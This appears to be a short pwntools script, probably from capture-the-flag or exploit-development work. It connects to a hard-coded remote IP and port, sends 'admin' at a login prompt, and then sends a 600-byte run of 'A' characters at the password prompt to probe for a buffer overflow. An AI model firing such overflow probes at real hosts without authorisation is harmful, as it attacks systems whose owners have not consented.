from pwn import *

L = 600
r = remote("123.56.252.211", 11954, timeout=6)
print("banner:", repr(r.recvrepeat(timeout=2)))
r.sendline(b"admin")
try:
    r.recvuntil(b"Password:", timeout=2)
except:
    pass
r.send(b"A" * L)
resp = r.recvrepeat(timeout=3)
print(f"len={L}, repr={repr(resp)}")
r.close()
